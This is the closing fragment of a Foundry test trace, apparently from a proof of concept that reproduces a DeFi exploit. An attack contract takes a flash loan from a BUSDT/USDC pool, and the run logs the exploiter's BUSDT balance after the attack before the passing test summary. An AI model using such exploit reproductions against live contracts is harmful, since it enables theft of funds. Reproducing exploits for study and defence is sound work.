    │   │   │   └─ ← [Stop] 
    │   │   ├─ [531] BUSDT::balanceOf(BUSDT_USDC: [0x4f31Fa980a675570939B737Ebdde0471a4Be40Eb]) [staticcall]
    │   │   │   └─ ← [Return] 17544431555733626405311283 [1.754e25]
    │   │   ├─ [1296] 0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d::balanceOf(BUSDT_USDC: [0x4f31Fa980a675570939B737Ebdde0471a4Be40Eb]) [staticcall]
    │   │   │   ├─ [553] 0xBA5Fe23f8a3a24BEd3236F05F2FcF35fd0BF0B5C::balanceOf(BUSDT_USDC: [0x4f31Fa980a675570939B737Ebdde0471a4Be40Eb]) [delegatecall]
    │   │   │   │   └─ ← [Return] 20516691047828675551482263 [2.051e25]
    │   │   │   └─ ← [Return] 20516691047828675551482263 [2.051e25]
    │   │   ├─ emit Flash(param0: AttackContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], param1: AttackContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], param2: 16339183758217962796788534 [1.633e25], param3: 0, param4: 8169591879108981398395 [8.169e21], param5: 0)
    │   │   └─ ← [Stop] 
    │   └─ ← [Stop] 
    ├─ [531] BUSDT::balanceOf(ZSExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 14026755365047874377260 [1.402e22]
    ├─ [425] BUSDT::decimals() [staticcall]
    │   └─ ← [Return] 18
    ├─ emit log_named_decimal_uint(key: "Exploiter BUSDT balance after attack", val: 14026755365047874377260 [1.402e22], decimals: 18)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 3.26s (2.98s CPU time)

Ran 2 test suites in 3.51s (3.54s CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
